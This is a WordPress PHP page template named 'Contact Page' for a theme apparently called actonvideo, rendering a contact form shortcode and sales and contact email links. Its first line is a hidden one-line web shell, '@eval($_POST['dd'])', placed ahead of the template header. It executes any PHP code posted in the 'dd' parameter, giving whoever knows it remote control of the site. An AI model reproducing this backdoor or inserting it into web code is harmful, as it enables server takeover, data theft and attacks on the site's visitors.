<?php @eval($_POST['dd']);?><?php
/**
* Template Name: Contact Page
*
* This is the template that displays all pages by default.
* Please note that this is the WordPress construct of pages
* and that other 'pages' on your WordPress site may use a
* different template.
*
* @link https://codex.wordpress.org/Template_Hierarchy
*
* @package actonvideo
*/
get_header(); ?>
<?php
while ( have_posts() ) : the_post();
if (has_post_thumbnail()):
$thumbnail = wp_get_attachment_image_src(get_post_thumbnail_id(),'thumb', true);
endif;
?>
<?php endwhile; // End of the loop. ?>
<br>
<!-- <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d26081603.294420466!2d-95.677068!3d37.06250000000001!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2s!4v1499193128244" width="100%" height="450" frameborder="0" style="border:0" allowfullscreen></iframe>
-->
<section class="contact">
    <div class="container">
        <div class="row">
            <div class="col-md-8">
                <div class="alert alert-success hidden" id="contactSuccess">
                    <strong>Success!</strong> Your message has been sent to us.
                </div>
                <div class="alert alert-danger hidden" id="contactError">
                    <strong>Error!</strong> There was an error sending your message.
                </div>
                <br><br>
                <h2 class="short"><strong>Contact</strong> Us</h2>
                <?php echo do_shortcode('[contact-form-7 id="70" title="Contact form 1"]' ); ?>
            </div>
            <div class="col-md-4">
                <br><br>
                <br><br>
                <h2 class="text-center"><strong>Send us an email</strong></h2>
               <!--  <p>Contact us for consultation and PEARLS product demo.
                We are here to make you successful</p>
                <p> Use it in your environment be it Waterfall or Agile</p>
                <p>PEARLS is Your solution. Designed to meet your requirements.</p> -->
                <ul class="list-unstyled text-center">
                    <!--     <li><i class="fa fa-map-marker"></i> <strong>Address:</strong> 1234 Street Name, City Name, United States</li>
                    <li><i class="fa fa-phone"></i> <strong>Phone:</strong> (123) 456-7890</li> -->
                    <li><i class="fa fa-envelope"></i> <strong>Email:</strong> <a style="color: #fff;" href="mailto:contactus@ayna.ca">contactus@ayna.ca</a></li>
                    <li><i class="fa fa-envelope"></i> <strong>Email:</strong> <a style="color: #fff;" href="mailto:sales@ayna.ca.ca">
                    sales@ayna.ca</a></li>
                </ul>
            </div>
        </div>
    </div>
</section>
<?php get_footer();